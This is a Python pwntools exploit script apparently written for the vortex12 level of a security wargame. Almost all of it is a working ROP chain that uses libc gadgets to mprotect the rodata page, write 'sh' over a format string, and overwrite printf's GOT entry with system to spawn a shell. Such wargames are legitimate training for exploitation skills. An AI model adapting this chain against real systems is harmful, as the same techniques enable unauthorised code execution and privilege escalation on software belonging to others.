#!/usr/bin/python3
from pwn import *
import sys
import os

elf = ELF('/vortex/vortex12')
elf.address = 0x8048000
libc = elf.libc
libc.address =  0xf7c00000

rop = ROP(elf, badchars=b'\x00')
libcrop = ROP(libc, badchars=b'\x00')

context.binary = elf

def call_mprotect(rop, page):
    MOV_EDX_EAX = 0x00198ca0 + libc.address # mov edx, eax; xor eax, eax; tzcnt edx, edx; add eax, edx; ret
    XOR_EAX_FFFFFFFF = 0x001192f0 + libc.address # xor eax, 0xffffffff; ret
    MOV_EAX_ECX = 0x0002f6ac + libc.address # mov eax, ecx; ret
    INC_EBX = 0x0006b229 + libc.address # inc ebx; ret 
    NOP = 0x0002fce8 + libc.address # nop; ret
    SYSCALL = 0x000df619 + libc.address # call dword gs:[0x10]; ret
    JMP_EAX = 0x000218e7 + libc.address # jmp eax
    POP_EDI = 0x00021e78 + libc.address
    POP_EAX = 0x0002ed92 + libc.address
    POP_EBX = 0x0002c01f + libc.address
    POP_ECX_POP_EDX = 0x00037374 + libc.address # pop ecx; pop edx; ret

    # Get length of '0xffffffff' into ecx
    rop.raw(POP_ECX_POP_EDX)
    rop.raw(0xffffffff)
    rop.raw(0xffffffff)
    
    # Get '7' into edx (prot of RWX)
    rop.raw(POP_EAX)
    rop.raw(0xffffff7f)
    rop.raw(XOR_EAX_FFFFFFFF)
    # TZCNT counts trailing 0's, then adds them
    # Get 0x80 into EDX, TZCNT should set it to 7
    rop.raw(MOV_EDX_EAX)

    # Get page of '%d' address into ebx
    rop.raw(POP_EBX)
    rop.raw(page-1)
    rop.raw(INC_EBX)

    # Get 0x7d into eax (mprotect)
    rop.raw(POP_EAX)
    rop.raw(0xffffff82)
    rop.raw(XOR_EAX_FFFFFFFF)

    # Make mprotect syscall
    rop.raw(SYSCALL)


# Mangles edx, ecx, eax
def arb_write(rop, val, dst, next_gadget):
    FILL = 'AAAA'
    POP_EAX = 0x0002ed92 + libc.address
    POP_ECX_POP_EDX = 0x00037374 + libc.address # pop ecx; pop edx; ret
    WR = 0x000f772a + libc.address # mov dword ptr [eax], ecx; mov eax, edx; ret;

    rop.raw(POP_EAX)
    rop.raw(dst)
    rop.raw(POP_ECX_POP_EDX)
    rop.raw(val)
    rop.raw(FILL)
    rop.raw(WR)
    rop.raw(next_gadget)
    

# mprotect to make '%d' string area writeable
# write 'sssh' to '%d' loc-2 (thereby pushing sh into string)
# finally, overwrite 'printf' got entry with addr of system
# ???
# profit

def gen_rop():
    global rop
    POP_EAX = 0x0002ed92 + libc.address
    JMP_EAX = 0x000218e7 + libc.address
    SYSTEM = 0x48170 + libc.address 
    STR_ADDR = 0x0804a008
    NOP = 0x0002fce8 + libc.address # nop; ret
    FILL = 'AAAA'

    # Move stack address containing rop chain (for strpcy)
    rop.raw(0xffffd522)

    # Need some fill to offset start of rop chain in the stack
    rop.raw(FILL * 258)

    # mprotect on the rodata section
    call_mprotect(rop, 0x0804a000)
    # Replace global '%d' with 'sh'
    arb_write(rop, 'sssh', STR_ADDR-2, NOP)

    # Replace 'printf' GOT entry with 'system'
    arb_write(rop, SYSTEM, elf.got['printf'], NOP)

    # JMP EAX infinite loop
    rop.raw(POP_EAX)
    rop.raw(JMP_EAX)
    rop.raw(JMP_EAX)
    return rop


def main():
    rop = gen_rop()
    # print(hexdump(rop))
    # os.execl('/bin/gdb', 'gdb', "--args", "/vortex/vortex12", rop.chain())
    os.execl('/vortex/vortex12', 'vortex12', rop.chain())


if __name__ == '__main__':
    main()
  
